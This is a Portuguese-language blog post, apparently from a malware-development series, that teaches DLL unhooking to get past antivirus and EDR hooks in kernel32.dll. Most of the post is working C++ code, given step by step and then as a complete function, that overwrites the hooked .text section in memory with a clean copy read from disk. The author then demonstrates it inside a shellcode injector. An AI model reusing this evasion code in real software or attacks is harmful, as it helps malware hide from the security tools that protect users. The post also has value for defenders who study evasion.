---
weight: 5
title: "Post V: Unhooking Windows API"
date: 2024-08-25T15:58:26+08:00
lastmod: 2024-08-25T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Bom ao longo dos anos, os antivírus têm melhorado cada vez mais suas técnicas de detecção. Uma dessas técnicas é realizar um hooking nas DLLs no Windows, que podem ser utilizadas por malwares.
no post de hoje vou abordar uma técnica antiga e simples de como podemos realizar a técnica de DLL unhooking para contornar possíveis antivírus.

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.
## O que é um hook?

No contexto de antivírus, um hook pode ser usado para monitorar e modificar chamadas de funções em APIs do sistema, como as fornecidas pela `kernel32.dll`.
por exemplo um antivírus pode usar hooks para interceptar chamadas a funções como `CreateFile` ou `ReadFile` para detectar atividades suspeitas de malware, caso queira saber mais sobre recomendo que leia meu post: [Creating-EDR-AV](https://vith0r.github.io/posts/Creating-EDR-AV/).

![](https://telegra.ph/file/9e0be2c0844129fedcc9a.png)

---
### Unhooking

Digamos que temos um antivírus que realiza um hooking apenas na `kernel32.dll` para monitorar o uso de APIs como `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory` e `CreateRemoteThread`.
se quisermos contornar esse antivírus, poderíamos ler a seção `.text` da `kernel32.dll` presente no disco e substituí-la pela seção `.text` mapeada na memória do processo.
ou seja, apenas vamos copiar o original sem o hooking, e escrever sobre o que está hooked.

![](https://telegra.ph/file/4650538c47cb7365c3da1.png)

---
### Monitoring APIs

Para a prova prática vamos usar um injetor simples, sem o código de unhooking para observar como ele se comporta perante o EDR/AV que fiz:

![](https://telegra.ph/file/aa79fbd4e99d908824285.png)

## Código de unhooking:

### Obtendo o Handle do Processo e do Módulo

```cpp
HANDLE process = GetCurrentProcess();
MODULEINFO mi = {};
HMODULE kernel32Module = GetModuleHandleA("kernel32.dll");

if (kernel32Module == NULL) {
    std::cerr << "Erro ao obter o handle do modulo kernel32.dll" << std::endl;
    return;
}
else {
    std::cout << "Handle do modulo kernel32.dll obtido com sucesso." << std::endl;
}
```

`GetCurrentProcess()`: Obtém um handle para o processo atual.
`GetModuleHandleA("kernel32.dll")`: Obtém o handle do módulo `kernel32.dll` que está carregado no processo atual, isso permite acessar informações sobre o módulo.
### Obtendo Informações do Módulo

```cpp
if (!GetModuleInformation(process, kernel32Module, &mi, sizeof(mi))) {
    std::cerr << "Erro ao obter informacoes do modulo kernel32.dll" << std::endl;
    return;
}
else {
    std::cout << "Informacoes do modulo kernel32.dll obtidas com sucesso!" << std::endl;
}
```

`GetModuleInformation()`: Preenche a estrutura `MODULEINFO` com informações sobre o módulo especificado, incluindo a base do módulo e o tamanho, isso é necessário para manipular a memória do módulo.
### Abrindo o Arquivo DLL e Criando Mapeamento

```cpp
HANDLE kernel32File = CreateFileA("c:\\windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

if (kernel32File == INVALID_HANDLE_VALUE) {
    std::cerr << "Erro ao abrir o arquivo kernel32.dll." << std::endl;
    return;
}
else {
    std::cout << "Arquivo kernel32.dll aberto com sucesso!" << std::endl;
}

HANDLE kernel32Mapping = CreateFileMapping(kernel32File, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
if (kernel32Mapping == NULL) {
    std::cerr << "Erro ao criar o mapeamento de arquivo para kernel32.dll" << std::endl;
    CloseHandle(kernel32File);
    return;
}
else {
    std::cout << "Mapeamento de arquivo para kernel32.dll criado com sucesso!" << std::endl;
}
```

`CreateFileA()`: Abre o arquivo `kernel32.dll` no diretório do sistema.
`CreateFileMapping()`: Cria um mapeamento de arquivo para a DLL, permitindo que o conteúdo do arquivo seja acessado diretamente na memória.
### Mapeando o Arquivo na Memória

```cpp
LPVOID kernel32MappingAddress = MapViewOfFile(kernel32Mapping, FILE_MAP_READ, 0, 0, 0);
if (kernel32MappingAddress == NULL) {
    std::cerr << "Erro ao mapear o arquivo kernel32.dll na memoria." << std::endl;
    CloseHandle(kernel32Mapping);
    CloseHandle(kernel32File);
    return;
}
else {
    std::cout << "Arquivo kernel32.dll mapeado na memoria com sucesso!" << std::endl;
}
```

`MapViewOfFile()`: Mapeia a visão do arquivo para a memória, permitindo que o conteúdo do arquivo seja lido diretamente.
### Restaurando a Seção `.text` do Módulo

```cpp
PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)kernel32Base;
PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)kernel32Base + hookedDosHeader->e_lfanew);

for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

    if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
        DWORD oldProtection = 0;
        bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)kernel32Base + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
        if (!isProtected) {
            std::cerr << "Erro ao alterar as permissões de memoria na secao .text" << std::endl;
            UnmapViewOfFile(kernel32MappingAddress);
            CloseHandle(kernel32Mapping);
            CloseHandle(kernel32File);
            return;
        }

        memcpy((LPVOID)((DWORD_PTR)kernel32Base + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)kernel32MappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
        std::cout << "Secao .text restaurada com sucesso!" << std::endl;

        isProtected = VirtualProtect((LPVOID)((DWORD_PTR)kernel32Base + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        if (!isProtected) {
            std::cerr << "Erro ao restaurar as permissoes de memoria na secao .text" << std::endl;
            UnmapViewOfFile(kernel32MappingAddress);
            CloseHandle(kernel32Mapping);
            CloseHandle(kernel32File);
            return;
        }
    }
}
```

`PIMAGE_DOS_HEADER` e `PIMAGE_NT_HEADERS`: Estruturas que representam o cabeçalho do arquivo PE (Portable Executable) da DLL.
`VirtualProtect()`: Modifica as permissões de proteção da memória para permitir escrita.
`memcpy()`: Copia a seção `.text` da DLL mapeada de volta para o módulo carregado na memória.
### Limpando e Concluindo

```cpp
UnmapViewOfFile(kernel32MappingAddress);
CloseHandle(kernel32Mapping);
CloseHandle(kernel32File);
FreeLibrary(kernel32Module);

std::cout << "Operacao concluida com sucesso!" << std::endl;
```

`UnmapViewOfFile()`: Desfaz o mapeamento do arquivo da memória.
`CloseHandle()`: Fecha os handles abertos.
`FreeLibrary()`: Descarrega a DLL do processo.
## Código Completo:

```cpp
void Unhooking()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE kernel32Module = GetModuleHandleA("kernel32.dll");

	if (kernel32Module == NULL) {
		std::cerr << "Erro ao obter o handle do modulo kernel32.dll" << std::endl;
		return;
	}
	else {
		std::cout << "Handle do modulo kernel32.dll obtido com sucesso." << std::endl;
	}

	if (!GetModuleInformation(process, kernel32Module, &mi, sizeof(mi))) {
		std::cerr << "Erro ao obter informacoes do modulo kernel32.dll" << std::endl;
		return;
	}
	else {
		std::cout << "Informacoes do modulo kernel32.dll obtidas com sucesso!" << std::endl;
	}

	LPVOID kernel32Base = (LPVOID)mi.lpBaseOfDll;
	HANDLE kernel32File = CreateFileA("c:\\windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (kernel32File == INVALID_HANDLE_VALUE) {
		std::cerr << "Erro ao abrir o arquivo kernel32.dll." << std::endl;
		return;
	}
	else {
		std::cout << "Arquivo kernel32.dll aberto com sucesso!" << std::endl;
	}

	HANDLE kernel32Mapping = CreateFileMapping(kernel32File, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (kernel32Mapping == NULL) {
		std::cerr << "Erro ao criar o mapeamento de arquivo para kernel32.dll" << std::endl;
		CloseHandle(kernel32File);
		return;
	}
	else {
		std::cout << "Mapeamento de arquivo para kernel32.dll criado com sucesso!" << std::endl;
	}

	LPVOID kernel32MappingAddress = MapViewOfFile(kernel32Mapping, FILE_MAP_READ, 0, 0, 0);
	if (kernel32MappingAddress == NULL) {
		std::cerr << "Erro ao mapear o arquivo kernel32.dll na memoria." << std::endl;
		CloseHandle(kernel32Mapping);
		CloseHandle(kernel32File);
		return;
	}
	else {
		std::cout << "Arquivo kernel32.dll mapeado na memoria com sucesso!" << std::endl;
	}

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)kernel32Base;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)kernel32Base + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)kernel32Base + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			if (!isProtected) {
				std::cerr << "Erro ao alterar as permissões de memoria na secao .text" << std::endl;
				UnmapViewOfFile(kernel32MappingAddress);
				CloseHandle(kernel32Mapping);
				CloseHandle(kernel32File);
				return;
			}

			memcpy((LPVOID)((DWORD_PTR)kernel32Base + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)kernel32MappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			std::cout << "Secao .text restaurada com sucesso!" << std::endl;

			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)kernel32Base + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
			if (!isProtected) {
				std::cerr << "Erro ao restaurar as permissoes de memoria na secao .text" << std::endl;
				UnmapViewOfFile(kernel32MappingAddress);
				CloseHandle(kernel32Mapping);
				CloseHandle(kernel32File);
				return;
			}
		}
	}

	UnmapViewOfFile(kernel32MappingAddress);
	CloseHandle(kernel32Mapping);
	CloseHandle(kernel32File);
	FreeLibrary(kernel32Module);

	std::cout << "Operacao concluida com sucesso!" << std::endl;
}
```
## Prova De Conceito:

Note que, para realizar esta prova de conceito eu fiz o seguinte: adicionei ao código de um simples injetor de shellcode o código de unhooking e comentei o uso da API `OpenProcess` como [HOOKED], pois realizo o `unhooking` apenas depois do uso dessa API para mostrar que de fato a DLL do `EDR/AV` estava realizando o hook das APIs normalmente antes de realizar o `unhooking`.

<iframe width="560" height="315" src="https://www.youtube.com/watch?v=tMdifI5amjw" frameborder="0" allowfullscreen></iframe>
